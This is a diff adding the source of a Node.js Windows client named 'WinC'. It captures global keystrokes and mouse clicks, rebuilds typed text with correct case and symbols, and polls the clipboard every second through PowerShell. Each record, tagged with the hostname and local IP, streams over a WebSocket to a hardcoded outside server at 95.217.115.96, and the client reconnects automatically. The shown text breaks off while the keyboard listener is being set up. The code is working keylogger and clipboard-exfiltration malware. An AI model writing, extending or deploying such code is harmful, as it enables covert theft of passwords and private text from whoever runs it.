@@ -1,0 +1,1162 @@
+"use strict";
+
+const crypto = require("node:crypto");
+const { execFile } = require("node:child_process");
+const fs = require("node:fs");
+const http = require("node:http");
+const https = require("node:https");
+const net = require("node:net");
+const os = require("node:os");
+const path = require("node:path");
+const { URL } = require("node:url");
+const WebSocket = require("ws");
+const { GlobalKeyboardListener } = require("keyspy");
+
+/** VPS — edit here when the server moves (domain or IPv4). */
+const VPS_PUBLIC_HOST = "95.217.115.96";
+
+function isIpv4VpsHost(host) {
+  return /^\d{1,3}(\.\d{1,3}){3}$/.test(host);
+}
+
+function getPublicOrigin(host = VPS_PUBLIC_HOST) {
+  const scheme = isIpv4VpsHost(host) ? "http" : "https";
+  return `${scheme}://${host}`;
+}
+
+function buildDefaultRelayHost(host = VPS_PUBLIC_HOST) {
+  const scheme = isIpv4VpsHost(host) ? "ws" : "wss";
+  return `${scheme}://${host}/agent`;
+}
+
+const DEFAULT_PUBLIC_HOST = VPS_PUBLIC_HOST;
+const DEFAULT_RELAY_HOST = buildDefaultRelayHost();
+
+function keyspyPackageRoot() {
+  try {
+    return path.dirname(require.resolve("keyspy/package.json"));
+  } catch {
+    return null;
+  }
+}
+
+function findWinKeyServerExe() {
+  const root = keyspyPackageRoot();
+  if (!root) {
+    return null;
+  }
+  const candidates = [
+    path.join(root, "runtime", "WinKeyServer.exe"),
+    path.join(root, "build", "WinKeyServer.exe"),
+  ];
+  for (const candidate of candidates) {
+    if (fs.existsSync(candidate)) {
+      return candidate;
+    }
+  }
+  return null;
+}
+
+function runKeyspyBinaryDownload(keyspyRoot) {
+  const script = path.join(keyspyRoot, "scripts", "download-binaries.js");
+  if (!fs.existsSync(script)) {
+    throw new Error("keyspy download script missing. Run: npm install");
+  }
+  return new Promise((resolve, reject) => {
+    execFile(process.execPath, [script], { cwd: keyspyRoot, windowsHide: true }, (err, stdout, stderr) => {
+      if (stdout) {
+        process.stdout.write(stdout);
+      }
+      if (stderr) {
+        process.stderr.write(stderr);
+      }
+      if (err) {
+        reject(err);
+        return;
+      }
+      resolve();
+    });
+  });
+}
+
+async function ensureWinKeyServerExe() {
+  let exe = findWinKeyServerExe();
+  if (exe) {
+    return exe;
+  }
+  const root = keyspyPackageRoot();
+  if (!root) {
+    throw new Error("keyspy is not installed. In the client folder run: npm install");
+  }
+  console.log("WinKeyServer.exe not found — downloading keyspy Windows binary…");
+  await runKeyspyBinaryDownload(root);
+  exe = findWinKeyServerExe();
+  if (!exe) {
+    throw new Error(
+      "WinKeyServer.exe is still missing.\n" +
+        "In the client folder run:\n" +
+        "  npm install\n" +
+        "  npm run download-keyspy\n" +
+        "Then run npm start again.",
+    );
+  }
+  console.log(`WinKeyServer ready: ${exe}`);
+  return exe;
+}
+
+/** Windows: map key name to typed character via ToUnicodeEx (correct case + symbols). */
+function createWindowsTypableCharResolver() {
+  if (process.platform !== "win32") {
+    return null;
+  }
+  try {
+    const koffi = require("koffi");
+    const user32 = koffi.load("user32.dll");
+    const GetKeyboardState = user32.func("bool __stdcall GetKeyboardState(_Out_ uint8 * lpKeyState)");
+    const GetKeyState = user32.func("short __stdcall GetKeyState(int nVirtKey)");
+    const ToUnicodeEx = user32.func(
+      "int __stdcall ToUnicodeEx(uint32 wVirtKey, uint32 wScanCode, const uint8 * lpKeyState, uint16 * pwszBuff, int cchBuff, uint32 wFlags, void * dwhkl)"
+    );
+    const GetKeyboardLayout = user32.func("void * __stdcall GetKeyboardLayout(uint32 idThread)");
+    const outBuf = Buffer.alloc(8);
+
+    const applyShiftToState = (state, isDown) => {
+      const shiftFromOs = (GetKeyState(0x10) & 0x8000) !== 0;
+      const leftFromOs = (GetKeyState(0xa0) & 0x8000) !== 0;
+      const rightFromOs = (GetKeyState(0xa1) & 0x8000) !== 0;
+      const shiftFromMap = !!(
+        isDown &&
+        (isDown["LEFT SHIFT"] ||
+          isDown["RIGHT SHIFT"] ||
+          isDown.SHIFT ||
+          isDown.LSHIFT ||
+          isDown.RSHIFT)
+      );
+      if (shiftFromOs || shiftFromMap) {
+        state[0x10] |= 0x80;
+      }
+      if (leftFromOs || (isDown && (isDown["LEFT SHIFT"] || isDown.LSHIFT))) {
+        state[0xa0] |= 0x80;
+      }
+      if (rightFromOs || (isDown && (isDown["RIGHT SHIFT"] || isDown.RSHIFT))) {
+        state[0xa1] |= 0x80;
+      }
+    };
+
+    return (vKey, scanCode, isDown) => {
+      if (vKey == null || scanCode == null) {
+        return null;
+      }
+      const state = Buffer.alloc(256);
+      if (!GetKeyboardState(state)) {
+        return null;
+      }
+      applyShiftToState(state, isDown);
+      state[vKey] |= 0x80;
+      const capsToggle = GetKeyState(0x14) & 1;
+      if (capsToggle) {
+        state[0x14] |= 0x01;
+      } else {
+        state[0x14] &= 0xfe;
+      }
+      const keyboardLayout = GetKeyboardLayout(0);
+      const result = ToUnicodeEx(vKey, scanCode, state, outBuf, 4, 0, keyboardLayout);
+      if (result === 1) {
+        const code = outBuf.readUInt16LE(0);
+        if (code === 0) {
+          return null;
+        }
+        return String.fromCharCode(code);
+      }
+      return null;
+    };
+  } catch (err) {
+    console.error("[WinC] Windows character API unavailable:", err.message);
+    return null;
+  }
+}
+
+const CONNECT_TIMEOUT_MS = 12000;
+const PROBE_PORTS = [3847, 8080, 80];
+const FALLBACK_PORTS = ["3847", "8080", "80"];
+const MODIFIERS = new Set([
+  "LEFT CTRL",
+  "RIGHT CTRL",
+  "LEFT SHIFT",
+  "RIGHT SHIFT",
+  "SHIFT",
+  "LSHIFT",
+  "RSHIFT",
+  "LEFT ALT",
+  "RIGHT ALT",
+  "LEFT META",
+  "RIGHT META",
+  "CAPS LOCK",
+  "CAPSLOCK",
+]);
+
+function defaultPortForProtocol(protocol) {
+  return protocol === "wss:" ? "443" : "80";
+}
+
+function formatRelayUrl(parsed) {
+  const protocol = parsed.protocol;
+  const defaultPort = defaultPortForProtocol(protocol);
+  const port = parsed.port || defaultPort;
+  const urlPath = `${parsed.pathname}${parsed.search}`;
+  if (port === defaultPort) {
+    return `${protocol}//${parsed.hostname}${urlPath}`;
+  }
+  return `${protocol}//${parsed.hostname}:${port}${urlPath}`;
+}
+
+function isIpv4Host(host) {
+  return /^\d{1,3}(\.\d{1,3}){3}$/.test(host);
+}
+
+function hostPartFromServerInput(input) {
+  const trimmed = String(input).trim();
+  if (/^wss?:\/\//i.test(trimmed)) {
+    return new URL(trimmed).hostname;
+  }
+  return trimmed.split("/")[0].split(":")[0];
+}
+
+function normalizeAgentUrl(input) {
+  let url = String(input).trim();
+  if (!/^wss?:\/\//i.test(url)) {
+    const hostPart = hostPartFromServerInput(url);
+    url = isIpv4Host(hostPart) ? `ws://${url}` : `wss://${url}`;
+  }
+  const parsed = new URL(url);
+  if (!parsed.pathname || parsed.pathname === "/") {
+    parsed.pathname = "/agent";
+  } else {
+    parsed.pathname = parsed.pathname.replace(/\/+$/, "");
+    if (!parsed.pathname.endsWith("/agent")) {
+      parsed.pathname = `${parsed.pathname}/agent`;
+    }
+  }
+  return formatRelayUrl(parsed);
+}
+
+function buildWsUrl(baseUrl, token) {
+  const parsed = new URL(baseUrl);
+  if (token) {
+    parsed.searchParams.set("token", token);
+  }
+  return formatRelayUrl(parsed);
+}
+
+function hostFromServerInput(serverInput) {
+  return new URL(normalizeAgentUrl(serverInput)).hostname;
+}
+
+function buildConnectionCandidates(serverInput, token, preferredPort, preferTls) {
+  const normalized = normalizeAgentUrl(serverInput);
+  const parsed = new URL(normalized);
+  const seen = new Set();
+  const list = [];
+  const tlsFirst = preferTls || parsed.protocol === "wss:";
+
+  const add = (protocol, port) => {
+    const u = new URL(normalized);
+    u.protocol = protocol;
+    u.port = port ? String(port) : "";
+    const withToken = buildWsUrl(formatRelayUrl(u), token);
+    if (!seen.has(withToken)) {
+      seen.add(withToken);
+      list.push(withToken);
+    }
+  };
+
+  if (tlsFirst) {
+    if (preferredPort === 443 || preferredPort === null) {
+      add("wss:", "");
+    } else if (preferredPort) {
+      add("wss:", preferredPort === 443 ? "" : String(preferredPort));
+    }
+    add(parsed.protocol, parsed.port || "");
+    return list;
+  }
+
+  if (preferredPort) {
+    add("ws:", preferredPort === 80 ? "" : String(preferredPort));
+  }
+  add(parsed.protocol, parsed.port || "");
+  const explicitPort = parsed.port;
+  for (const port of FALLBACK_PORTS) {
+    if (port !== explicitPort && String(preferredPort) !== port) {
+      add("ws:", port);
+    }
+  }
+  if (explicitPort !== "443" && preferredPort !== 443) {
+    add("wss:", "443");
+  }
+  return list;
+}
+
+function tcpProbe(host, port, timeoutMs = 6000) {
+  return new Promise((resolve) => {
+    const socket = net.connect({ host, port, timeout: timeoutMs });
+    const done = (ok) => {
+      socket.removeAllListeners();
+      try {
+        socket.destroy();
+      } catch {
+        /* ignore */
+      }
+      resolve(ok);
+    };
+    socket.once("connect", () => done(true));
+    socket.once("error", () => done(false));
+    socket.once("timeout", () => done(false));
+  });
+}
+
+function httpsHealth(host, port, timeoutMs = 8000) {
+  return new Promise((resolve) => {
+    const req = https.request(
+      { host, port, path: "/health", method: "GET", timeout: timeoutMs, servername: host },
+      (res) => {
+        let body = "";
+        res.on("data", (c) => {
+          body += c;
+        });
+        res.on("end", () => {
+          if (res.statusCode !== 200) {
+            resolve(false);
+            return;
+          }
+          try {
+            resolve(JSON.parse(body).ok === true);
+          } catch {
+            resolve(false);
+          }
+        });
+      },
+    );
+    req.on("error", () => resolve(false));
+    req.on("timeout", () => {
+      req.destroy();
+      resolve(false);
+    });
+    req.end();
+  });
+}
+
+function httpHealth(host, port, timeoutMs = 8000) {
+  return new Promise((resolve) => {
+    const req = http.request({ host, port, path: "/health", method: "GET", timeout: timeoutMs }, (res) => {
+      let body = "";
+      res.on("data", (c) => {
+        body += c;
+      });
+      res.on("end", () => {
+        if (res.statusCode !== 200) {
+          resolve(false);
+          return;
+        }
+        try {
+          resolve(JSON.parse(body).ok === true);
+        } catch {
+          resolve(false);
+        }
+      });
+    });
+    req.on("error", () => resolve(false));
+    req.on("timeout", () => {
+      req.destroy();
+      resolve(false);
+    });
+    req.end();
+  });
+}
+
+async function discoverRelayPort(host, serverBase) {
+  const report = [];
+  const normalized = normalizeAgentUrl(serverBase);
+  const parsed = new URL(normalized);
+  const tlsPreferred = parsed.protocol === "wss:" || !isIpv4Host(host);
+
+  if (tlsPreferred) {
+    if (await httpsHealth(host, 443)) {
+      report.push("  HTTPS :443 /health OK (Hostinger / reverse proxy)");
+      return { port: 443, report, preferTls: true };
+    }
+    if (await tcpProbe(host, 443)) {
+      report.push(
+        "  HTTPS :443 is open but /health failed — trying WSS anyway (deploy WinC server on Hostinger for this domain)",
+      );
+      return { port: 443, report, preferTls: true };
+    }
+    report.push("  HTTPS :443 not reachable (DNS, SSL, or firewall)");
+  }
+
+  for (const port of PROBE_PORTS) {
+    if (!(await tcpProbe(host, port))) {
+      report.push(`  port ${port}: TCP closed (firewall or server not running)`);
+      continue;
+    }
+    if (await httpHealth(host, port)) {
+      report.push(`  port ${port}: OK (WinC server found)`);
+      return { port, report, preferTls: false };
+    }
+    report.push(`  port ${port}: TCP open but /health failed`);
+  }
+  return { port: null, report, preferTls: tlsPreferred };
+}
+
+function normalizeModifier(name) {
+  if (name.includes("CTRL")) return "Ctrl";
+  if (name.includes("SHIFT")) return "Shift";
+  if (name.includes("ALT")) return "Alt";
+  if (name.includes("META")) return "Win";
+  return name;
+}
+
+function formatModifiers(isDown) {
+  const order = ["Ctrl", "Shift", "Alt", "Win"];
+  const held = new Set();
+  for (const key of Object.keys(isDown)) {
+    if (isDown[key] && MODIFIERS.has(key)) {
+      held.add(normalizeModifier(key));
+    }
+  }
+  return order.filter((m) => held.has(m));
+}
+
+function isMouseKey(name) {
+  if (!name) return false;
+  const upper = name.toUpperCase();
+  return (
+    upper.includes("MOUSE") ||
+    upper === "LBUTTON" ||
+    upper === "RBUTTON" ||
+    upper === "MBUTTON" ||
+    upper.startsWith("XBUTTON")
+  );
+}
+
+function buildEventRecord(event, isDown, options = {}) {
+  const name = event.name ?? "UNKNOWN";
+  const mods = formatModifiers(isDown);
+  const mouse = isMouseKey(name);
+  if (options.combosOnly && event.state === "DOWN" && !mouse) {
+    if (MODIFIERS.has(name) || mods.length === 0) return null;
+  }
+  const combo =
+    event.state === "DOWN" && mods.length > 0 && !MODIFIERS.has(name) && !mouse
+      ? `${mods.join("+")}+${name}`
+      : null;
+  const record = {
+    type: mouse ? "mouse" : "keyboard",
+    timestamp: new Date().toISOString(),
+    state: event.state,
+    key: name,
+    modifiers: mods,
+    combo,
+  };
+  if (mouse && event.location) {
+    record.x = event.location[0];
+    record.y = event.location[1];
+  }
+  if (event.vKey !== undefined) {
+    record.vKey = event.vKey;
+  }
+  if (event.scanCode !== undefined) {
+    record.scanCode = event.scanCode;
+  }
+  if (options.raw && event.rawKey?._nameRaw) {
+    record.rawName = event.rawKey._nameRaw;
+  }
+  if (record.state === "DOWN" && !mouse && options.typingState) {
+    const ch = options.typingState.keyToChar(name, mods, record.vKey, record.scanCode, isDown);
+    if (ch && ch.length === 1) {
+      record.char = ch;
+    }
+  }
+  return record;
+}
+
+function formatEventLine(record) {
+  if (record.type === "text") {
+    return `${record.timestamp}  TEXT [${record.delimiter}]  ${record.text}`;
+  }
+  if (record.type === "clipboard") {
+    const flat = String(record.text || "").replace(/\s+/g, " ").trim();
+    const preview = flat.length > 100 ? `${flat.slice(0, 100)}…` : flat;
+    return `${record.timestamp}  CLIPBOARD  ${preview}`;
+  }
+  const label = record.combo ?? record.key;
+  const prefix = record.type === "mouse" ? "MOUSE" : "KEY";
+  const parts = [record.timestamp, record.state.padEnd(2), `${prefix} ${label}`];
+  if (record.x !== undefined) parts.push(`@${record.x},${record.y}`);
+  return parts.join("  ");
+}
+
+const SHIFT_NUMBER_US = {
+  "1": "!",
+  "2": "@",
+  "3": "#",
+  "4": "$",
+  "5": "%",
+  "6": "^",
+  "7": "&",
+  "8": "*",
+  "9": "(",
+  "0": ")",
+};
+
+const SHIFT_SYMBOL_US = {
+  "-": "_",
+  "=": "+",
+  "[": "{",
+  "]": "}",
+  "\\": "|",
+  ";": ":",
+  "'": '"',
+  ",": "<",
+  ".": ">",
+  "/": "?",
+  "`": "~",
+};
+
+/** keyspy standardName / OEM name → US base symbol (before shift). */
+const STANDARD_NAME_TO_CHAR = {
+  SEMICOLON: ";",
+  OEM_1: ";",
+  EQUALS: "=",
+  OEM_PLUS: "=",
+  COMMA: ",",
+  OEM_COMMA: ",",
+  MINUS: "-",
+  OEM_MINUS: "-",
+  DOT: ".",
+  OEM_PERIOD: ".",
+  "FORWARD SLASH": "/",
+  OEM_2: "/",
+  BACKTICK: "`",
+  SECTION: "`",
+  OEM_3: "`",
+  OEM_102: "`",
+  "SQUARE BRACKET OPEN": "[",
+  OEM_4: "[",
+  "SQUARE BRACKET CLOSE": "]",
+  OEM_6: "]",
+  BACKSLASH: "\\",
+  OEM_5: "\\",
+  QUOTE: "'",
+  OEM_7: "'",
+};
+
+function baseSymbolKey(key) {
+  if (STANDARD_NAME_TO_CHAR[key] !== undefined) {
+    return STANDARD_NAME_TO_CHAR[key];
+  }
+  if (key.length === 1) {
+    return key;
+  }
+  return null;
+}
+
+let shiftStateApi = null;
+
+function getShiftStateApi() {
+  if (process.platform !== "win32") {
+    return null;
+  }
+  if (shiftStateApi !== null) {
+    return shiftStateApi;
+  }
+  try {
+    const koffi = require("koffi");
+    shiftStateApi = koffi.load("user32.dll").func("short __stdcall GetKeyState(int nVirtKey)");
+  } catch {
+    shiftStateApi = false;
+  }
+  return shiftStateApi || null;
+}
+
+function isShiftHeldFromOs() {
+  const GetKeyState = getShiftStateApi();
+  if (!GetKeyState) {
+    return false;
+  }
+  return (
+    (GetKeyState(0x10) & 0x8000) !== 0 ||
+    (GetKeyState(0xa0) & 0x8000) !== 0 ||
+    (GetKeyState(0xa1) & 0x8000) !== 0
+  );
+}
+
+function isShiftHeld(modifiers, isDown) {
+  if (isDown) {
+    if (
+      isDown["LEFT SHIFT"] ||
+      isDown["RIGHT SHIFT"] ||
+      isDown.SHIFT ||
+      isDown.LSHIFT ||
+      isDown.RSHIFT
+    ) {
+      return true;
+    }
+  }
+  if (modifiers && modifiers.includes("Shift")) {
+    return true;
+  }
+  return isShiftHeldFromOs();
+}
+
+function readCapsLockOnWindows() {
+  if (process.platform !== "win32") {
+    return false;
+  }
+  try {
+    const koffi = require("koffi");
+    const GetKeyState = koffi.load("user32.dll").func("short __stdcall GetKeyState(int nVirtKey)");
+    return (GetKeyState(0x14) & 1) !== 0;
+  } catch {
+    return false;
+  }
+}
+
+function createTypingState(resolveWindowsChar) {
+  let capsLockOn = readCapsLockOnWindows();
+
+  function fallbackKeyToChar(key, modifiers, isDown) {
+    const shiftHeld = isShiftHeld(modifiers, isDown);
+    const symbolKey = baseSymbolKey(key);
+    const letter = key.length === 1 && /[A-Z]/i.test(key);
+    if (letter) {
+      const upper = shiftHeld !== capsLockOn;
+      return upper ? key.toUpperCase() : key.toLowerCase();
+    }
+    if (symbolKey && symbolKey.length === 1 && /[0-9]/.test(symbolKey)) {
+      return shiftHeld ? (SHIFT_NUMBER_US[symbolKey] ?? symbolKey) : symbolKey;
+    }
+    if (symbolKey && SHIFT_SYMBOL_US[symbolKey] !== undefined) {
+      return shiftHeld ? SHIFT_SYMBOL_US[symbolKey] : symbolKey;
+    }
+    if (key === "SPACE") return " ";
+    if (key === "TAB") return "\t";
+    return null;
+  }
+
+  return {
+    syncCapsLockFromOs() {
+      capsLockOn = readCapsLockOnWindows();
+    },
+    toggleCapsLock() {
+      capsLockOn = !capsLockOn;
+      capsLockOn = readCapsLockOnWindows();
+    },
+    keyToChar(key, modifiers, vKey, scanCode, isDown) {
+      const shiftHeld = isShiftHeld(modifiers, isDown);
+      const fallback = fallbackKeyToChar(key, modifiers, isDown);
+
+      if (shiftHeld && fallback) {
+        return fallback;
+      }
+
+      if (resolveWindowsChar) {
+        const ch = resolveWindowsChar(vKey, scanCode, isDown);
+        if (ch && ch.length === 1) {
+          return ch;
+        }
+      }
+
+      return fallback;
+    },
+  };
+}
+
+function isLeftMouseDown(record) {
+  if (record.state !== "DOWN" || record.type !== "mouse") {
+    return false;
+  }
+  const key = record.key.toUpperCase();
+  return key === "MOUSE LEFT" || key === "LBUTTON";
+}
+
+function isEnterKey(name) {
+  const upper = String(name || "").toUpperCase();
+  return (
+    upper === "RETURN" ||
+    upper === "ENTER" ||
+    upper === "NUMPAD ENTER" ||
+    upper === "NUMPAD_ENTER"
+  );
+}
+
+function isLeftMouseDownKey(name, state) {
+  if (state !== "DOWN" || !isMouseKey(name)) {
+    return false;
+  }
+  return isLeftMouseDown({ state: "DOWN", type: "mouse", key: name });
+}
+
+function createTextBuffer(typingState) {
+  let buffer = "";
+
+  function flush(delimiter, meta) {
+    const text = buffer;
+    buffer = "";
+    if (!text) {
+      return null;
+    }
+    return {
+      type: "text",
+      timestamp: new Date().toISOString(),
+      delimiter,
+      text,
+      ...meta,
+    };
+  }
+
+  return {
+    getText() {
+      return buffer;
+    },
+    appendFromKey(record, isDown) {
+      const key = record.key;
+      if (MODIFIERS.has(key)) {
+        return false;
+      }
+      if (isEnterKey(key)) {
+        return false;
+      }
+      if (key === "BACK" || key === "BACKSPACE") {
+        buffer = buffer.slice(0, -1);
+        return true;
+      }
+      if (record.modifiers.some((m) => ["Ctrl", "Alt", "Win"].includes(m))) {
+        return false;
+      }
+      const ch = typingState.keyToChar(key, formatModifiers(isDown), record.vKey, record.scanCode, isDown);
+      if (ch) {
+        buffer += ch;
+        return true;
+      }
+      return false;
+    },
+    flush,
+  };
+}
+
+function typingPreviewPayload(textBuffer, meta) {
+  return {
+    type: "typing",
+    timestamp: new Date().toISOString(),
+    text: textBuffer.getText(),
+    ...meta,
+  };
+}
+
+function safeCloseSocket(socket) {
+  if (!socket) return;
+  socket.on("error", () => {});
+  socket.removeAllListeners("open");
+  socket.removeAllListeners("message");
+  socket.removeAllListeners("close");
+  try {
+    if (socket.readyState === WebSocket.CONNECTING) socket.terminate();
+    else if (socket.readyState === WebSocket.OPEN) socket.close();
+  } catch {
+    /* ignore */
+  }
+}
+
+function waitForWebSocketOpen(socket, timeoutMs) {
+  if (socket.readyState === WebSocket.OPEN) return Promise.resolve();
+  return new Promise((resolve, reject) => {
+    let settled = false;
+    const timer = setTimeout(() => {
+      if (settled) return;
+      settled = true;
+      cleanup();
+      safeCloseSocket(socket);
+      reject(new Error("Timed out waiting for WebSocket connection"));
+    }, timeoutMs);
+    const onOpen = () => {
+      if (settled) return;
+      settled = true;
+      cleanup();
+      resolve();
+    };
+    const onError = () => {
+      if (settled) return;
+      settled = true;
+      cleanup();
+      safeCloseSocket(socket);
+      reject(new Error("WebSocket connection failed"));
+    };
+    const cleanup = () => {
+      clearTimeout(timer);
+      socket.removeListener("open", onOpen);
+      socket.removeListener("error", onError);
+    };
+    socket.once("open", onOpen);
+    socket.once("error", onError);
+  });
+}
+
+async function connectWithFallback(serverBase, token) {
+  const host = hostFromServerInput(serverBase);
+  console.log(`Discovering WinC server on ${host} …`);
+  const { port: discoveredPort, report, preferTls } = await discoverRelayPort(host, serverBase);
+  console.log(report.join("\n"));
+  const candidates = buildConnectionCandidates(serverBase, token, discoveredPort, preferTls);
+  console.log("WebSocket attempts:");
+  for (const url of candidates) console.log(`  → ${url}`);
+  let lastError = "unknown error";
+  for (const url of candidates) {
+    const socket = new WebSocket(url, { handshakeTimeout: CONNECT_TIMEOUT_MS, perMessageDeflate: false });
+    try {
+      await waitForWebSocketOpen(socket, CONNECT_TIMEOUT_MS);
+      socket.removeAllListeners("error");
+      return { socket, url };
+    } catch (err) {
+      lastError = err.message;
+      safeCloseSocket(socket);
+    }
+  }
+  const viewerBase = getPublicOrigin();
+  let hint = preferTls
+    ? `Open https://${host}/health (expect {"ok":true}). Viewer: ${viewerBase}/ — deploy server with WebSocket /agent.`
+    : `Open firewall + run server. Test: ${viewerBase}/health (or http://${host}:3847/health)`;
+  if (/404/.test(lastError)) {
+    hint = `Host ${host} returned HTTP 404 for /agent — the WinC Node app is not running on this domain yet. Upload server/ to Hostinger, set start command to npm start, then verify /health.`;
+  }
+  if (!discoveredPort) {
+    throw new Error(`No reachable WinC server on ${host}.\n${hint}`);
+  }
+  throw new Error(`WebSocket failed (${lastError}).\n${hint}`);
+}
+
+function getPrimaryLocalIpv4() {
+  const nets = os.networkInterfaces();
+  for (const ifName of Object.keys(nets)) {
+    for (const net of nets[ifName] ?? []) {
+      if (net.family === "IPv4" && !net.internal) {
+        return net.address;
+      }
+    }
+  }
+  for (const ifName of Object.keys(nets)) {
+    for (const net of nets[ifName] ?? []) {
+      if (net.family === "IPv4") {
+        return net.address;
+      }
+    }
+  }
+  return "0.0.0.0";
+}
+
+const CLIPBOARD_PS_COMMAND =
+  "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::GetText()";
+const DEFAULT_CLIPBOARD_MS = 1000;
+const MAX_CLIPBOARD_CHARS = 256 * 1024;
+
+function powershellExe() {
+  const windir = process.env.windir || process.env.WINDIR;
+  if (windir) {
+    return path.join(windir, "System32", "WindowsPowerShell", "v1.0", "powershell.exe");
+  }
+  return "powershell.exe";
+}
+
+function readWindowsClipboardText(callback) {
+  if (process.platform !== "win32") {
+    callback(null);
+    return;
+  }
+  execFile(
+    powershellExe(),
+    ["-NoProfile", "-STA", "-Command", CLIPBOARD_PS_COMMAND],
+    { encoding: "utf8", maxBuffer: 4 * 1024 * 1024, windowsHide: true },
+    (err, stdout) => {
+      if (err) {
+        callback(null);
+        return;
+      }
+      callback(stdout ?? "");
+    },
+  );
+}
+
+function normalizeClipboardText(raw, maxChars = MAX_CLIPBOARD_CHARS) {
+  if (raw == null) {
+    return null;
+  }
+  let text = String(raw).replace(/\r\n/g, "\n").replace(/\r/g, "\n");
+  if (!text.trim()) {
+    return null;
+  }
+  if (text.length > maxChars) {
+    text = `${text.slice(0, maxChars)}\n… [clipboard truncated]`;
+  }
+  return text;
+}
+
+function createClipboardMonitor({ intervalMs, onCapture, maxChars = MAX_CLIPBOARD_CHARS }) {
+  let lastDigest = null;
+  let timer = null;
+  let reading = false;
+
+  function digest(text) {
+    return crypto.createHash("sha256").update(text, "utf8").digest("hex");
+  }
+
+  function tick(initialSeed) {
+    if (reading) {
+      return;
+    }
+    reading = true;
+    readWindowsClipboardText((raw) => {
+      reading = false;
+      const text = normalizeClipboardText(raw, maxChars);
+      if (!text) {
+        return;
+      }
+      const nextDigest = digest(text);
+      if (initialSeed) {
+        lastDigest = nextDigest;
+        return;
+      }
+      if (nextDigest === lastDigest) {
+        return;
+      }
+      lastDigest = nextDigest;
+      onCapture(text);
+    });
+  }
+
+  return {
+    start() {
+      if (process.platform !== "win32" || !intervalMs || intervalMs < 200) {
+        return false;
+      }
+      tick(true);
+      timer = setInterval(() => tick(false), intervalMs);
+      return true;
+    },
+    stop() {
+      if (timer) {
+        clearInterval(timer);
+        timer = null;
+      }
+    },
+  };
+}
+
+function parseArgs(argv) {
+  const defaultServer = DEFAULT_RELAY_HOST;
+  const clipboardMsEnv = process.env.WINC_CLIPBOARD_MS;
+  const options = {
+    server: normalizeAgentUrl(defaultServer),
+    token: process.env.WINC_TOKEN || "",
+    name: process.env.WINC_CLIENT_NAME || os.hostname(),
+    clientIp: process.env.WINC_CLIENT_IP || getPrimaryLocalIpv4(),
+    raw: false,
+    combosOnly: false,
+    logFile: null,
+    reconnectMs: 5000,
+    clipboardMs: clipboardMsEnv ? Number(clipboardMsEnv) : DEFAULT_CLIPBOARD_MS,
+  };
+  for (let i = 0; i < argv.length; i += 1) {
+    const arg = argv[i];
+    if (arg === "--server" || arg === "-s") {
+      options.server = normalizeAgentUrl(argv[++i]);
+    } else if (arg === "--token" || arg === "-t") {
+      options.token = argv[++i];
+    } else if (arg === "--name" || arg === "-n") {
+      options.name = argv[++i];
+    } else if (arg === "--ip") {
+      options.clientIp = argv[++i];
+    } else if (arg === "--raw" || arg === "-r") {
+      options.raw = true;
+    } else if (arg === "--combos-only" || arg === "-c") {
+      options.combosOnly = true;
+    } else if (arg === "--log" || arg === "-l") {
+      options.logFile = path.resolve(argv[++i]);
+    } else if (arg === "--clipboard-ms") {
+      options.clipboardMs = Number(argv[++i]);
+    } else if (arg === "--no-clipboard") {
+      options.clipboardMs = 0;
+    } else if (arg === "--help" || arg === "-h") {
+      console.log(`npm install && npm start
+Default server: ${DEFAULT_RELAY_HOST}
+Optional: npm start -- --server ${DEFAULT_RELAY_HOST} --name "My-PC"`);
+      process.exit(0);
+    }
+  }
+  return options;
+}
+
+async function main() {
+  const options = parseArgs(process.argv.slice(2));
+  const agentMeta = {
+    hostname: os.hostname(),
+    clientName: options.name,
+    clientIp: options.clientIp,
+    platform: process.platform,
+  };
+  const relayHost = hostFromServerInput(options.server);
+  console.log(`Client PC: ${agentMeta.clientName} (${agentMeta.clientIp})`);
+  console.log(`VPS: ${relayHost}`);
+  let logStream = options.logFile ? fs.createWriteStream(options.logFile, { flags: "a" }) : null;
+  const writeLine = (line) => {
+    console.log(line);
+    if (logStream) logStream.write(`${line}\n`);
+  };
+  let ws = null;
+  let shouldRun = true;
+  let reconnectTimer = null;
+  let activeRelayBase = options.server;
+  const resolveWindowsChar = createWindowsTypableCharResolver();
+  if (resolveWindowsChar) {
+    console.log("Using Windows keyboard layout for typed characters (case + symbols).");
+  }
+  const typingState = createTypingState(resolveWindowsChar);
+  const textBuffer = createTextBuffer(typingState);
+
+  const sendPayload = (payload) => {
+    if (payload.type !== "typing") {
+      writeLine(formatEventLine({ ...agentMeta, ...payload }));
+    }
+    if (ws?.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify({ ...agentMeta, ...payload }));
+    }
+  };
+
+  const disconnectSocket = () => {
+    clearTimeout(reconnectTimer);
+    reconnectTimer = null;
+    if (ws) {
+      safeCloseSocket(ws);
+      ws = null;
+    }
+  };
+
+  const attachSocketHandlers = (socket) => {
+    socket.on("message", (raw) => {
+      try {
+        const data = JSON.parse(String(raw));
+        if (data.type === "agent-ack") console.log(`Server OK (${data.agentsOnline ?? "?"} agents)`);
+      } catch {
+        /* ignore */
+      }
+    });
+    socket.on("close", () => {
+      ws = null;
+      if (shouldRun) {
+        reconnectTimer = setTimeout(() => startConnection().catch((e) => console.error(e.message)), options.reconnectMs);
+      }
+    });
+    socket.on("error", (e) => console.error("WebSocket error:", e.message));
+  };
+
+  async function startConnection() {
+    if (!shouldRun) return;
+    disconnectSocket();
+    const { socket, url } = await connectWithFallback(activeRelayBase, options.token);
+    ws = socket;
+    activeRelayBase = url.split("?")[0];
+    options.server = normalizeAgentUrl(activeRelayBase);
+    console.log(`Connected via ${url}`);
+    attachSocketHandlers(ws);
+    ws.send(JSON.stringify({ type: "hello", role: "agent", ...agentMeta }));
+  }
+
+  await startConnection();
+
+  const clipboardMonitor = createClipboardMonitor({
+    intervalMs: options.clipboardMs,
+    onCapture: (text) => {
+      sendPayload({
+        type: "clipboard",
+        timestamp: new Date().toISOString(),
+        text,
+      });
+    },
+  });
+  if (clipboardMonitor.start()) {
+    console.log(`Clipboard capture every ${options.clipboardMs}ms (new copy only).`);
+  } else if (process.platform !== "win32") {
+    console.log("Clipboard capture: Windows only (skipped).");
+  }
+
+  const windowsKeyspyConfig = {
+    onError: (c) => console.error(`[keyspy ${c}]`),
+    onInfo: (i) => console.error(`[keyspy] ${i}`),
+  };
+  if (process.platform === "win32") {
+    windowsKeyspyConfig.serverPath = await ensureWinKeyServerExe();
+  }
+
+  const keyboard = new GlobalKeyboardListener({
+    windows: windowsKeyspyConfig,
